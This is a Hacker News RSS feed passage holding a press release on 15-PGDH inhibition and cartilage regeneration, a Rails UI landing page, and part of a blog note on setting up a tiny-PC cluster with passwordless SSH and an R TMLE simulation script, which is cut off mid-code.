    &lt;p&gt;A Direct Attack on Osteoarthritis&lt;/p&gt;
    &lt;p&gt;Osteoarthritis is a degenerative joint disease that affects about one in five adults in the United States and generates an estimated $65 billion each year in direct health care costs. Current treatments focus on managing pain or replacing damaged joints surgically. There are no approved drugs that can slow or reverse the underlying cartilage damage.&lt;/p&gt;
    &lt;p&gt;The new approach targets the root cause of the disease rather than its symptoms, offering a potential shift in how osteoarthritis is treated.&lt;/p&gt;
    &lt;p&gt;The Role of a Master Aging Enzyme&lt;/p&gt;
    &lt;p&gt;The protein at the center of the study is called 15-PGDH. Researchers refer to it as a gerozyme because its levels increase as the body ages. Gerozymes were identified by the same research team in 2023 and are known to drive the gradual loss of tissue function.&lt;/p&gt;
    &lt;p&gt;In mice, higher levels of 15-PGDH are linked to declining muscle strength with age. Blocking the enzyme using a small molecule boosted muscle mass and endurance in older animals. In contrast, forcing young mice to produce more 15-PGDH caused their muscles to shrink and weaken. The protein has also been connected to regeneration in bone, nerve, and blood cells.&lt;/p&gt;
    &lt;p&gt;In most of these tissues, repair happens through the activation and specialization of stem cells. Cartilage appears to be different. In this case, chondrocytes change how their genes behave, shifting into a more youthful state without relying on stem cells.&lt;/p&gt;
    &lt;p&gt;A New Path to Tissue Regeneration&lt;/p&gt;
    &lt;p&gt;"This is a new way of regenerating adult tissue, and it has significant clinical promise for treating arthritis due to aging or injury," said Helen Blau, PhD, professor of microbiology and immunology. "We were looking for stem cells, but they are clearly not involved. It's very exciting."&lt;/p&gt;
    &lt;p&gt;Blau, who leads the Baxter Laboratory for Stem Cell Biology and holds the Donald E. and Delia B. Baxter Foundation Professorship, and Nidhi Bhutani, PhD, associate professor of orthopaedic surgery, are the study's senior authors. The research was published in Science. Mamta Singla, PhD, instructor of orthopaedic surgery, and former postdoctoral scholar Yu Xin (Will) Wang, PhD, served as lead authors. Wang is now an assistant professor at the Sanford Burnham Institute in San Diego.&lt;/p&gt;
    &lt;p&gt;Dramatic Regeneration of Joint Cartilage&lt;/p&gt;
    &lt;p&gt;"Millions of people suffer from joint pain and swelling as they age," Bhutani said. "It is a huge unmet medical need. Until now, there has been no drug that directly treats the cause of cartilage loss. But this gerozyme inhibitor causes a dramatic regeneration of cartilage beyond that reported in response to any other drug or intervention."&lt;/p&gt;
    &lt;p&gt;The human body contains three main types of cartilage. Elastic cartilage is soft and flexible and forms structures such as the outer ear. Fibrocartilage is dense and tough, helping absorb shock in places like the spaces between spinal vertebrae. Hyaline cartilage is smooth and glossy, allowing joints such as the hips, knees, shoulders, and ankles to move with low friction. This type, also called articular cartilage, is the form most commonly damaged in osteoarthritis.&lt;/p&gt;
    &lt;p&gt;Why Cartilage Rarely Grows Back&lt;/p&gt;
    &lt;p&gt;Osteoarthritis develops when joints are stressed by aging, injury, or obesity. Chondrocytes begin releasing inflammatory molecules and breaking down collagen, the main structural protein in cartilage. As collagen is lost, cartilage becomes thinner and softer. Inflammation then leads to swelling and pain, which are hallmarks of the disease.&lt;/p&gt;
    &lt;p&gt;Under normal conditions, articular cartilage has very limited ability to regenerate. While some stem or progenitor cells capable of forming cartilage have been identified in bone, similar cells have not been successfully found within articular cartilage itself.&lt;/p&gt;
    &lt;p&gt;Connecting Aging, Prostaglandins, and Repair&lt;/p&gt;
    &lt;p&gt;Earlier research from Blau's lab showed that prostaglandin E2 is essential for muscle stem cell function. The enzyme 15-PGDH breaks down prostaglandin E2. By blocking 15-PGDH or increasing prostaglandin E2 levels, researchers previously supported the repair of damaged muscle, nerve, bone, colon, liver, and blood cells in young mice.&lt;/p&gt;
    &lt;p&gt;This led the team to question whether the same pathway might be involved in cartilage aging and joint damage. When they compared knee cartilage from young and old mice, they found that 15-PGDH levels roughly doubled with age.&lt;/p&gt;
    &lt;p&gt;Regrowing Cartilage in Aging Knees&lt;/p&gt;
    &lt;p&gt;Researchers then injected older mice with a small molecule that inhibits 15-PGDH. They first administered the drug into the abdomen to affect the entire body, and later injected it directly into the knee joint. In both cases, cartilage that had become thin and dysfunctional with age thickened across the joint surface.&lt;/p&gt;
    &lt;p&gt;Additional tests confirmed that the regenerated tissue was hyaline cartilage rather than the less functional fibrocartilage.&lt;/p&gt;
    &lt;p&gt;"Cartilage regeneration to such an extent in aged mice took us by surprise," Bhutani said. "The effect was remarkable."&lt;/p&gt;
    &lt;p&gt;Protecting Joints After ACL-Like Injuries&lt;/p&gt;
    &lt;p&gt;The team observed similar benefits in mice with knee injuries resembling ACL tears, which often occur during sports involving sudden stopping, pivoting, or jumping. Although such injuries can be surgically repaired, about half of affected people develop osteoarthritis in the injured joint within 15 years.&lt;/p&gt;
    &lt;p&gt;Mice that received twice-weekly injections of the gerozyme inhibitor for four weeks after injury were far less likely to develop osteoarthritis. In contrast, animals given a control treatment had double the levels of 15-PGDH compared with uninjured mice and developed osteoarthritis within four weeks.&lt;/p&gt;
    &lt;p&gt;Treated mice also moved more normally and placed more weight on the injured leg than untreated animals.&lt;/p&gt;
    &lt;p&gt;"Interestingly, prostaglandin E2 has been implicated in inflammation and pain," Blau said. "But this research shows that, at normal biological levels, small increases in prostaglandin E2 can promote regeneration."&lt;/p&gt;
    &lt;p&gt;Reprogramming Cartilage Cells Without Stem Cells&lt;/p&gt;
    &lt;p&gt;Closer analysis showed that chondrocytes in older mice expressed more genes linked to inflammation and the conversion of cartilage into bone, along with fewer genes involved in cartilage formation. Treatment shifted these patterns.&lt;/p&gt;
    &lt;p&gt;One group of chondrocytes that produced 15-PGDH and cartilage-degrading genes dropped from 8% to 3%. Another group associated with fibrocartilage formation declined from 16% to 8%. A third population, which did not produce 15-PGDH and instead expressed genes tied to hyaline cartilage formation and maintenance of the extracellular matrix, rose from 22% to 42%.&lt;/p&gt;
    &lt;p&gt;These changes indicate a broad return to a more youthful cartilage profile without involving stem or progenitor cells.&lt;/p&gt;
    &lt;p&gt;Evidence From Human Cartilage Samples&lt;/p&gt;
    &lt;p&gt;The researchers also tested cartilage taken from patients undergoing total knee replacement for osteoarthritis. After one week of treatment with the 15-PGDH inhibitor, the tissue showed fewer 15-PGDH-producing chondrocytes, reduced expression of cartilage degradation and fibrocartilage genes, and early signs of articular cartilage regeneration.&lt;/p&gt;
    &lt;p&gt;"The mechanism is quite striking and really shifted our perspective about how tissue regeneration can occur," Bhutani said. "It's clear that a large pool of already existing cells in cartilage are changing their gene expression patterns. And by targeting these cells for regeneration, we may have an opportunity to have a bigger overall impact clinically."&lt;/p&gt;
    &lt;p&gt;Looking Toward Human Trials&lt;/p&gt;
    &lt;p&gt;Blau added, "Phase 1 clinical trials of a 15-PGDH inhibitor for muscle weakness have shown that it is safe and active in healthy volunteers. Our hope is that a similar trial will be launched soon to test its effect in cartilage regeneration. We are very excited about this potential breakthrough. Imagine regrowing existing cartilage and avoiding joint replacement."&lt;/p&gt;
    &lt;p&gt;Researchers from the Sanford Burnham Prebys Medical Discovery Institute also contributed to the study.&lt;/p&gt;
    &lt;p&gt;The work was supported by funding from the National Institutes of Health (grants R01AR070864, R01AR077530, R01AG069858 and R00NS120278), the Baxter Foundation for Stem Cell Biology, the Li Ka Shing Foundation, the Stanford Cardiovascular Institute, the Milky Way Research Foundation, the Canadian Institutes of Health Research, a Stanford Translational Research and Applied Medicine Pilot grant, a GlaxoSmithKline Sir James Black Postdoctoral Fellowship, and a Stanford Dean's Postdoctoral Fellowship.&lt;/p&gt;
    &lt;p&gt;Blau, Bhutani, and other co-authors are inventors on patent applications held by Stanford University related to 15-PGDH inhibition in cartilage and tissue rejuvenation, which are licensed to Epirium Bio. Blau is a co-founder of Myoforte/Epirium and holds equity and stock options in the company.&lt;/p&gt;
    &lt;p&gt;Story Source:&lt;/p&gt;
    &lt;p&gt;Materials provided by Stanford Medicine. Note: Content may be edited for style and length.&lt;/p&gt;
    &lt;p&gt;Journal Reference:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Mamta Singla, Yu Xin Wang, Elena Monti, Yudhishtar Bedi, Pranay Agarwal, Shiqi Su, Sara Ancel, Maiko Hermsmeier, Nitya Devisetti, Akshay Pandey, Mohsen Afshar Bakooshli, Adelaida R. Palla, Stuart Goodman, Helen M Blau, Nidhi Bhutani. Inhibition of 15-hydroxy prostaglandin dehydrogenase promotes cartilage regeneration. Science, 2025; DOI: 10.1126/science.adx6649&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Cite This Page:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46709179</guid><pubDate>Wed, 21 Jan 2026 18:05:36 +0000</pubDate></item><item><title>Show HN: Rails UI</title><link>https://railsui.com/</link><description>&lt;doc fingerprint="7d1af0212bdc2360"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Stop fighting CSS and build beautiful Rails apps faster&lt;/head&gt;
    &lt;p&gt;No more ugly Rails apps. Get professional-looking components and themes that work perfectly with Rails‚Äîno design skills required.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Booking date&lt;/cell&gt;
        &lt;cell role="head"&gt;Property&lt;/cell&gt;
        &lt;cell role="head"&gt;Payout&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;p&gt;June 1, 2026&lt;/p&gt;
          &lt;p&gt;7:38 PM CST&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Cozy Mountain A-Frame&lt;/cell&gt;
        &lt;cell&gt;$1,165.45&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;p&gt;Aug 3, 2026&lt;/p&gt;
          &lt;p&gt;7:38 PM CST&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Mountain Vista Chalet&lt;/cell&gt;
        &lt;cell&gt;$2,846.46&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;p&gt;Jul 18, 2026&lt;/p&gt;
          &lt;p&gt;4:30 PM CST&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Cozy Mountain A-Frame&lt;/cell&gt;
        &lt;cell&gt;$1,326.36&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Pro&lt;/p&gt;
    &lt;p&gt;Active subscriber&lt;/p&gt;
    &lt;p&gt;Monthly&lt;/p&gt;
    &lt;p&gt;Sarah updated deal status to "Qualified"&lt;/p&gt;
    &lt;p&gt;2 hours ago&lt;/p&gt;
    &lt;p&gt;New contact added: John Smith&lt;/p&gt;
    &lt;p&gt;Yesterday&lt;/p&gt;
    &lt;p&gt;Acme Corporation&lt;/p&gt;
    &lt;p&gt;Enterprise Plan ‚Ä¢ 12 team members&lt;/p&gt;
    &lt;p&gt;Next invoice: $299/mo&lt;/p&gt;
    &lt;p&gt;Due on Feb 1, 2025&lt;/p&gt;
    &lt;head rend="h1"&gt;Sign in to your account&lt;/head&gt;
    &lt;p&gt;Or sign up for an account&lt;/p&gt;
    &lt;head rend="h2"&gt;Enhanced User Authentication System&lt;/head&gt;
    &lt;p&gt;A small-batch cycle to build a refreshed authentication flow.&lt;/p&gt;
    &lt;p&gt;Components&lt;/p&gt;
    &lt;head rend="h3"&gt;Components that make your Rails app look professional&lt;/head&gt;
    &lt;p&gt;No design experience? No problem. Copy-paste beautiful forms, buttons, and layouts that work perfectly with Rails. Focus on your business logic‚Äîwe've got the pretty stuff covered.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Accordion&lt;/item&gt;
      &lt;item&gt;Alert&lt;/item&gt;
      &lt;item&gt;Badge&lt;/item&gt;
      &lt;item&gt;Button&lt;/item&gt;
      &lt;item&gt;Card&lt;/item&gt;
      &lt;item&gt;Dropdown&lt;/item&gt;
      &lt;item&gt;Modal&lt;/item&gt;
    &lt;/list&gt;
    &lt;head class="flex w-full cursor-pointer select-none justify-between text-left text-base font-semibold leading-7 text-slate-900 group-open:text-indigo-600 [&amp;amp;::-webkit-details-marker]:hidden dark:group-open:text-indigo-300 dark:text-white"&gt;How do I import contacts from a CSV file?&lt;/head&gt;
    &lt;head class="flex w-full cursor-pointer select-none justify-between text-left text-base font-semibold leading-7 text-slate-900 group-open:text-indigo-600 [&amp;amp;::-webkit-details-marker]:hidden dark:group-open:text-indigo-300 dark:text-white"&gt;Can I customize my deal pipeline stages?&lt;/head&gt;
    &lt;head class="flex w-full cursor-pointer select-none justify-between text-left text-base font-semibold leading-7 text-slate-900 group-open:text-indigo-600 [&amp;amp;::-webkit-details-marker]:hidden dark:group-open:text-indigo-300 dark:text-white"&gt;How do automated follow-up reminders work?&lt;/head&gt;
    &lt;head rend="h3"&gt;Time to launch&lt;/head&gt;
    &lt;p&gt;The beta is no more. &lt;lb/&gt;We are ready to go live.&lt;/p&gt;
    &lt;p&gt;Themes&lt;/p&gt;
    &lt;head rend="h3"&gt; Complete app designs that don't look like &lt;lb/&gt; programmer art&lt;/head&gt;
    &lt;p&gt;Skip the hours of CSS frustration. Get complete, professional-looking app layouts that work with Rails out of the box. Your users will think you hired a designer.&lt;/p&gt;
    &lt;head rend="h3"&gt;Collie&lt;/head&gt;
    &lt;p&gt;Community platform&lt;/p&gt;
    &lt;head rend="h3"&gt;Husky&lt;/head&gt;
    &lt;p&gt;Personal Finance&lt;/p&gt;
    &lt;head rend="h3"&gt;Boxer&lt;/head&gt;
    &lt;p&gt;Agency Management&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;"Rails UI is going to save me months of work. I'm an experienced software developer building my first Ruby on Rails app, but I'm not strong at front-end design. Support has been awesome as well."&lt;/p&gt;Adam G. ‚Äî Software Developer&lt;/quote&gt;
    &lt;quote&gt;&lt;p&gt;"Launched our MVP in two weeks instead of two months. The themes look so polished that our investors thought we had a full design team."&lt;/p&gt;Sarah M. ‚Äî Startup Founder&lt;/quote&gt;
    &lt;quote&gt;&lt;p&gt;"My clients can't believe how fast I deliver now. Rails UI pays for itself on the first project."&lt;/p&gt;James T. ‚Äî Freelance Developer&lt;/quote&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46709543</guid><pubDate>Wed, 21 Jan 2026 18:31:19 +0000</pubDate></item><item><title>TeraWave Satellite Communications Network</title><link>https://www.blueorigin.com/news/blue-origin-introduces-terawave-space-based-network-for-global-connectivity</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46709548</guid><pubDate>Wed, 21 Jan 2026 18:31:58 +0000</pubDate></item><item><title>Setting Up a Cluster of Tiny PCs for Parallel Computing</title><link>https://www.kenkoonwong.com/blog/parallel-computing/</link><description>&lt;doc fingerprint="2b70a0463a6d9fb6"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Setting Up A Cluster of Tiny PCs For Parallel Computing - A Note To Myself&lt;/head&gt;
    &lt;p&gt;By Ken Koon Wong in r R future parallel computing cluster multicore tmle superlearner&lt;/p&gt;
    &lt;p&gt;January 16, 2026&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Enjoyed learning the process of setting up a cluster of tiny PCs for parallel computing. A note to myself on installing Ubuntu, passwordless SSH, automating package installation across nodes, distributing R simulations, and comparing CV5 vs CV10 performance. Fun project!&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h2"&gt;Motivations&lt;/head&gt;
    &lt;p&gt;Part of something I want to learn this year is getting a little more into parallel computing. How we can distribute simulation computations across different devices. Lately, we have more reasons to do this because quite a few of our simulations require long running computation and leaving my laptop running overnight or several days is just not a good use it. We have also tried cloud computing as well and without knowing how those distributed cores are, well, distributed, it‚Äôs hard for me to conceptualize how these are done and what else we could optimize. Hence, what is a better way of doing it on our own! Sit tight, this is going to be a bumpy one. Let‚Äôs go!&lt;/p&gt;
    &lt;head rend="h2"&gt;Objectives&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Which PCs to get?&lt;/item&gt;
      &lt;item&gt;Install Ubuntu&lt;/item&gt;
      &lt;item&gt;Align and fix IPs&lt;/item&gt;
      &lt;item&gt;Passwordless ssh&lt;/item&gt;
      &lt;item&gt;Send multiple commands via ssh&lt;/item&gt;
      &lt;item&gt;Compare time&lt;/item&gt;
      &lt;item&gt;Opportunities for improvement&lt;/item&gt;
      &lt;item&gt;Lessons learnt&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Which PCs to Get?&lt;/head&gt;
    &lt;p&gt;Preferably something functional and cheap! Something like a used Lenovo M715q Tiny PCs or something similar.&lt;/p&gt;
    &lt;head rend="h2"&gt;Install Ubuntu&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Download Ubuntu Server&lt;/item&gt;
      &lt;item&gt;Create a bootable USB using balenaEtcher&lt;/item&gt;
      &lt;item&gt;When starting Lenovo up, press F12 continuously until it shows an option to boot from USB. If F12 does not work, reboot and press F1 to BIOS. Go to &lt;code&gt;Startup&lt;/code&gt;Tab, change CSM Support to&lt;code&gt;Enabled&lt;/code&gt;. Then set&lt;code&gt;Primary Boot Priority&lt;/code&gt;to&lt;code&gt;USB&lt;/code&gt;by moving priority to first. Then&lt;code&gt;F10&lt;/code&gt;to save configuration and exit. It will then reboot to USB.&lt;/item&gt;
      &lt;item&gt;Make sure it‚Äôs connected to internet via LAN for smoother installation.&lt;/item&gt;
      &lt;item&gt;Follow the instructions to install Ubuntu, setting username, password etc. Then reboot.&lt;/item&gt;
      &lt;item&gt;Make sure to remove USB drive, if you didn‚Äôt it‚Äôll remind you. Et voila!&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The installations were very quick, compared to the other OS I‚Äôve installed in the past. Very smooth as well. I thoroughly enjoyed seeting these up.&lt;/p&gt;
    &lt;head rend="h2"&gt;Align and Fix IPs&lt;/head&gt;
    &lt;p&gt;For organizational purpose, make sure you go to your router setting and set your computer clusters to convenient IPs such as 192.168.1.101, 192.168.1.102, 192.168.1.103 etc. You may have to reboot your computer clusters after changing it on your router.&lt;/p&gt;
    &lt;head rend="h2"&gt;Passwordless SSH&lt;/head&gt;
    &lt;p&gt;Next, you want to set up passwordless SSH. This is crucial for R to work!&lt;/p&gt;
    &lt;head rend="h4"&gt;1. Create a key&lt;/head&gt;
    &lt;code&gt;ssh-keygen -t ed25519
&lt;/code&gt;
    &lt;head rend="h4"&gt;2. Send Copy of Key To Your Node&lt;/head&gt;
    &lt;code&gt;ssh-copy-id -i .ssh/my_key.pub username1@192.168.1.101 
&lt;/code&gt;
    &lt;p&gt;it will prompt you to enter your password, then after that you won‚Äôt need a pssword to ssh in.&lt;/p&gt;
    &lt;head rend="h3"&gt;Passwordless Sudo&lt;/head&gt;
    &lt;p&gt;This is optional. But if you‚Äôre like me, don‚Äôt want to repeat lots of typing on installation, and see if you can use bash or R to install packages, you‚Äôd need this.&lt;/p&gt;
    &lt;code&gt;ssh -t username2@192.168.1.102 'echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/$(whoami)'
&lt;/code&gt;
    &lt;p&gt;It would prompt you to enter your password. You would have to do this for all your nodes&lt;/p&gt;
    &lt;head rend="h2"&gt;Send Multiple Commands Via SSH&lt;/head&gt;
    &lt;head rend="h3"&gt;Install R&lt;/head&gt;
    &lt;code&gt;for host in username1@192.168.1.101 username2@192.168.1.102 username3@192.168.1.103; do
  ssh -t $host 'sudo apt update &amp;amp;&amp;amp; sudo apt install -y r-base r-base-dev'
done
&lt;/code&gt;
    &lt;p&gt;This is basically installing R on all of our clusters one after another.&lt;/p&gt;
    &lt;head rend="h3"&gt;Create A Template R script For Simulation&lt;/head&gt;
    &lt;p&gt;Why do we do this? We want to take advantage of the &lt;code&gt;multicore&lt;/code&gt; of each nodes as opposed to using &lt;code&gt;clusters&lt;/code&gt; on &lt;code&gt;future&lt;/code&gt; as the overhead network may add on to the time and makes optimization less efficiency. Instead, we will send a script to each node so that it can fork its own cores to run the simulation. Also, if we specify packages on our script, we can automate the process of installing these packages on our nodes.&lt;/p&gt;
    &lt;head&gt;code&lt;/head&gt;
    &lt;code&gt;library(future)
library(future.apply)
library(dplyr)
library(SuperLearner)
library(ranger)
library(xgboost)
library(glmnet)

plan(multicore, workers = 4)

set.seed(1)

n &amp;lt;- 10000
W1 &amp;lt;- rnorm(n)
W2 &amp;lt;- rnorm(n)
W3 &amp;lt;- rbinom(n, 1, 0.5)
W4 &amp;lt;- rnorm(n)

# TRUE propensity score model
A &amp;lt;- rbinom(n, 1, plogis(-0.5 + 0.8*W1 + 0.5*W2^2 + 0.3*W3 - 0.4*W1*W2 + 0.2*W4))

# TRUE outcome model
Y &amp;lt;- rbinom(n, 1, plogis(-1 + 0.2*A + 0.6*W1 - 0.4*W2^2 + 0.5*W3 + 0.3*W1*W3 + 0.2*W4^2))

# Calculate TRUE ATE
logit_Y1 &amp;lt;- -1 + 0.2 + 0.6*W1 - 0.4*W2^2 + 0.5*W3 + 0.3*W1*W3 + 0.2*W4^2
logit_Y0 &amp;lt;- -1 + 0 + 0.6*W1 - 0.4*W2^2 + 0.5*W3 + 0.3*W1*W3 + 0.2*W4^2

Y1_true &amp;lt;- plogis(logit_Y1)
Y0_true &amp;lt;- plogis(logit_Y0)
true_ATE &amp;lt;- mean(Y1_true - Y0_true)

df &amp;lt;- tibble(W1 = W1, W2 = W2, W3 = W3, W4 = W4, A = A, Y = Y)

tune &amp;lt;- list(
  ntrees = c(500,1000),           
  max_depth = c(5,7),                  
  shrinkage = c(0.001,0.01)    
)

tune2 &amp;lt;- list(
  ntrees = c(250, 500, 1000),
  max_depth = c(3,5,7,9),
  shrinkage = c(0.001,0.005,0.01)
)

learners &amp;lt;- create.Learner("SL.xgboost", tune = tune, detailed_names = TRUE, name_prefix = "xgb")
learners2 &amp;lt;- create.Learner("SL.xgboost", tune = tune2, detailed_names = TRUE, name_prefix = "xgb")

# Super Learner library 
SL_library &amp;lt;- list(
  c("SL.xgboost", "SL.ranger", "SL.glm", "SL.mean"),
  c("SL.xgboost","SL.ranger"),
  c("SL.xgboost","SL.glm"),
  list("SL.ranger", c("SL.xgboost", "screen.glmnet")),
  c("SL.glmnet","SL.glm"),
  c("SL.ranger","SL.glm"),
  c(learners$names, "SL.glm"),
  c(learners$names, "SL.glmnet"),
  c("SL.gam","SL.glm"),
  c(learners2$names, "SL.glm"))

# sample
allnum &amp;lt;- START:END
n_sample &amp;lt;- length(allnum)
n_i &amp;lt;- 6000

# Function to run one TMLE iteration
run_tmle_iteration &amp;lt;- function(seed_val, df, n_i, SL_library) {
  set.seed(seed_val)
  data &amp;lt;- slice_sample(df, n = n_i, replace = T) |&amp;gt; select(Y, A, W1:W4)
  
  # Prepare data
  X_outcome &amp;lt;- data |&amp;gt; select(A, W1:W4) |&amp;gt; as.data.frame()
  X_treatment &amp;lt;- data |&amp;gt; select(W1:W4) |&amp;gt; as.data.frame()
  Y_vec &amp;lt;- data$Y
  A_vec &amp;lt;- data$A
  
  # Outcome model
  SL_outcome &amp;lt;- SuperLearner(
    Y = Y_vec,
    X = X_outcome,
    family = binomial(),
    SL.library = SL_library,
    cvControl = list(V = 5)
  )
  
  # Initial predictions
  outcome &amp;lt;- predict(SL_outcome, newdata = X_outcome)$pred
  
  # Predict under treatment A=1
  X_outcome_1 &amp;lt;- X_outcome |&amp;gt; mutate(A=1)
  outcome_1 &amp;lt;- predict(SL_outcome, newdata = X_outcome_1)$pred
  
  # Predict under treatment A=0
  X_outcome_0 &amp;lt;- X_outcome |&amp;gt; mutate(A=0)
  outcome_0 &amp;lt;- predict(SL_outcome, newdata = X_outcome_0)$pred
  
  # Bound outcome predictions to avoid qlogis issues
  outcome &amp;lt;- pmax(pmin(outcome, 0.9999), 0.0001)
  outcome_1 &amp;lt;- pmax(pmin(outcome_1, 0.9999), 0.0001)
  outcome_0 &amp;lt;- pmax(pmin(outcome_0, 0.9999), 0.0001)
  
  # Treatment model
  SL_treatment &amp;lt;- SuperLearner(
    Y = A_vec,
    X = X_treatment,
    family = binomial(),
    SL.library = SL_library,
    cvControl = list(V = 5)
  )
  
  # Propensity scores
  ps &amp;lt;- predict(SL_treatment, newdata = X_treatment)$pred
  
  # Truncate propensity scores 
  ps_final &amp;lt;- pmax(pmin(ps, 0.95), 0.05)
  
  # Calculate clever covariates
  a_1 &amp;lt;- 1/ps_final
  a_0 &amp;lt;- -1/(1 - ps_final)
  clever_covariate &amp;lt;- ifelse(A_vec == 1, 1/ps_final, -1/(1 - ps_final))
  
  epsilon_model &amp;lt;- glm(Y_vec ~ -1 + offset(qlogis(outcome)) + clever_covariate, 
                       family = "binomial")
  epsilon &amp;lt;- coef(epsilon_model)
  
  updated_outcome_1 &amp;lt;- plogis(qlogis(outcome_1) + epsilon * a_1)
  updated_outcome_0 &amp;lt;- plogis(qlogis(outcome_0) + epsilon * a_0)
  
  # Calc ATE
  ate &amp;lt;- mean(updated_outcome_1 - updated_outcome_0)
  
  # Calc SE
  updated_outcome &amp;lt;- ifelse(A_vec == 1, updated_outcome_1, updated_outcome_0)
  se &amp;lt;- sqrt(var((Y_vec - updated_outcome) * clever_covariate + 
                   updated_outcome_1 - updated_outcome_0 - ate) / n_i)
  
  return(list(ate = ate, se = se))
}

# Run iterations in parallel
for (num in 1:length(SL_library)) {
  if (num %in% c(1:9)) { next }
  cat(num)
  cat("TMLE iterations in parallel with 4 workers (multicore)...\n")
  start_time &amp;lt;- Sys.time()
  
  results_list &amp;lt;- future_lapply(START:END, function(i) {
    result &amp;lt;- run_tmle_iteration(i, df, n_i, SL_library[[num]])
    if (i %% 100 == 0) cat("Completed iteration:", i, "\n")
    return(result)
  }, future.seed = TRUE)
  
  end_time &amp;lt;- Sys.time()
  run_time &amp;lt;- end_time - start_time
  
  # Extract results
  predicted_ate &amp;lt;- sapply(results_list, function(x) x$ate)
  pred_se &amp;lt;- sapply(results_list, function(x) x$se)
  
  # Results
  results &amp;lt;- tibble(
    iteration = START:END,
    ate = predicted_ate,
    se = pred_se,
    ci_lower = ate - 1.96 * se,
    ci_upper = ate + 1.96 * se,
    covers_truth = true_ATE &amp;gt;= ci_lower &amp;amp; true_ATE &amp;lt;= ci_upper
  )
  
  # Summary stats
  summary_stats &amp;lt;- tibble(
    metric = c("true_ATE", "mean_estimated_ATE", "median_estimated_ATE", 
               "sd_estimates", "mean_SE", "coverage_probability", "bias"),
    value = c(
      true_ATE,
      mean(predicted_ate),
      median(predicted_ate),
      sd(predicted_ate),
      mean(pred_se),
      mean(results$covers_truth),
      mean(predicted_ate) - true_ATE
    )
  )
  
  # Create output directory if it doesn't exist
  if (!dir.exists("tmle_results")) {
    dir.create("tmle_results")
  }
  
  # Save detailed results (all iterations)
  write.csv(results, paste0("tmle_results/tmle_iterations",num,".csv"), row.names = FALSE)
  
  # Save summary statistics
  write.csv(summary_stats, paste0("tmle_results/tmle_summary",num,".csv"), row.names = FALSE)
  
  # Save simulation parameters
  sim_params &amp;lt;- tibble(
    parameter = c("n_population", "n_sample_iterations", "n_bootstrap_size", 
                  "SL_library", "n_workers", "runtime_seconds"),
    value = c(n, n_sample, n_i, 
              paste(SL_library[[num]], collapse = ", "), 
              4, as.numeric(run_time, units = "secs"))
  )
  write.csv(sim_params, paste0("tmle_results/simulation_parameters",num,".csv"), row.names = FALSE)
  
  # Save as RData for easy loading
  save(results, summary_stats, sim_params, true_ATE, file = paste0("tmle_results/tmle_results",num,".RData"))

}
&lt;/code&gt;
    &lt;p&gt;What we did above is basically a template script (We are saving this as &lt;code&gt;par_test_script.R&lt;/code&gt;), one where we can edit where to begin and end in terms of which iteration to start and end per node. And also instruction to save result. This is when we can put a little more effort in incorporating some instructions to inform us when task is completed (e.g., via email) and also it would also be nice to know what is the ETA of the entire task by perhaps benchmarking how long the first iteration took to complete, then multiple by total iters per node. Again, this can be sent via email, and also maybe only for the first node as opposed to all nodes, so we‚Äôre not bombarded with messages beginning and the end. ü§£&lt;/p&gt;
    &lt;head rend="h3"&gt;Install Packages On All Nodes&lt;/head&gt;
    &lt;code&gt;## List all of our nodes
my_clusters &amp;lt;- list(
  c("username1@192.168.1.101"),
  c("username2@192.168.1.102"),
  c("username3@192.168.1.103"))


## Grab all of the packages needed on our script  
packages &amp;lt;- gsub("library\\(([^)]+)\\)", "\\1",grep("^library",readLines("par_test_script.R"),value = T))

## Create function to run sudo
remote_r_sudo &amp;lt;- function(host, r_code, intern = FALSE) {
  escaped &amp;lt;- gsub('"', '\\\\"', r_code)
  cmd &amp;lt;- sprintf("ssh %s 'sudo Rscript -e \"%s\"'", host, escaped)
  system(cmd, intern = intern)
}

## Loop over to install
for (cluster_i in my_clusters) {
  print(cluster_i)
  for (package in packages) {
  command &amp;lt;- sprintf('if (!require("%s")) install.packages("%s")', package, package)
  remote_r_sudo(cluster_i, command)
  }
}
&lt;/code&gt;
    &lt;p&gt;Make sure your computer doesn‚Äôt go to sleep with this. If this is the first time your nodes are installing these extensive libraries, it will take a while. Another way we can do this is to use &lt;code&gt;future_lapply&lt;/code&gt; for all nodes and also &lt;code&gt;tmux&lt;/code&gt; for all installations so that we don‚Äôt need to rely on our local workstation to be turned on to continue with the installation. See below on how we used &lt;code&gt;tmux&lt;/code&gt; to set and forget method.&lt;/p&gt;
    &lt;head rend="h2"&gt;Upload Rscript to Nodes&lt;/head&gt;
    &lt;p&gt;Alright, now we have installed the appropriate packages above, let‚Äôs upload scripts to our nodes.&lt;/p&gt;
    &lt;head rend="h4"&gt;Distribute Work&lt;/head&gt;
    &lt;code&gt;num_list &amp;lt;- list()
clust_num &amp;lt;- 3
total_loop &amp;lt;- 1000
